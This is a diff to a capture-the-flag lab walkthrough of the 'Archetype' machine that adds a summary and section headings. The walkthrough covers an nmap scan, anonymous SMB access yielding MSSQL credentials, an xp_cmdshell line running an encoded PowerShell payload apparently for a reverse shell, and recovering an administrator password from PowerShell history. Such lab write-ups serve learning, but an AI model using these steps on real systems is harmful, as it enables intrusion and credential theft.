@@ -3,6 +3,12 @@ layout: default
 title: Archetype
 ---
 
+## TL;DR
+
+Getting mssql user password from SMB server using annonymous login. Getting reverse shell using mssql server, and then find administrator password inside `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`.
+
+### Recon
+
 first we scan with `nmap`, this is the command:
 ```bash
 nmap -p- -sVC --min-rate=10000 $target
@@ -66,6 +72,8 @@ Host script results:
 |_  message_signing: disabled (dangerous, but default)
 ```
 
+### Get backups\prod.dtsConfig from anonymous login in SMB server
+
 When trying to connect using `smbclient` without proper credentials, we managed to list all the shares.
 
 This is the command, `-N` is for anonymous, not necessary for this case, and `-L` is for list shares:
@@ -97,6 +105,8 @@ Probably this is the same service we saw running on port `1433`.
     </Configuration>
 </DTSConfiguration>
 ```
+
+### Connect to MSSQL server with credentials
 
 now we need to connect to the *mssql* service, we can use this command, that based on tool from impacket tools, the `-windows-auth` flag is important, otherwise it won't work:
 ```bash
@@ -130,6 +140,8 @@ xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC
 And we got the user flag, which is found in C:\Users\<user>\Desktop\user.txt.
 
 ![user flag](image-6.png)
+
+### Getting administrator password from C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 
 In order to achieve the root flag, we need to escalate our privilege.
 So, let's use winPEAS.exe.
